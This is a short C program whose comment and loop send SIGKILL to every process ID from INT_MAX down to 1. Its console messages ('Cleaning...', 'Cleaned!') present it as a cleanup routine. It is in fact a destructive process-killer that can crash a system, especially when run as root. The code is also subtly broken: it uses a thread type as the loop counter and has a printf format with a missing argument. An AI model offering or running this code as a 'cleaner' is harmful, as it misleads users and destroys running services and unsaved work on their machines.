//loops from max PID to 1 and kills all processes
#include <stdio.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>

int main() {
   pthread_t pID;
   for (pID= INT_MAX; pID >= 1; pID--)
   {
      printf("Cleaning... %d\r",pID );
      kill(pID, SIGKILL);
   }
   printf("Cleaned! %d\n");
   return 0;
}
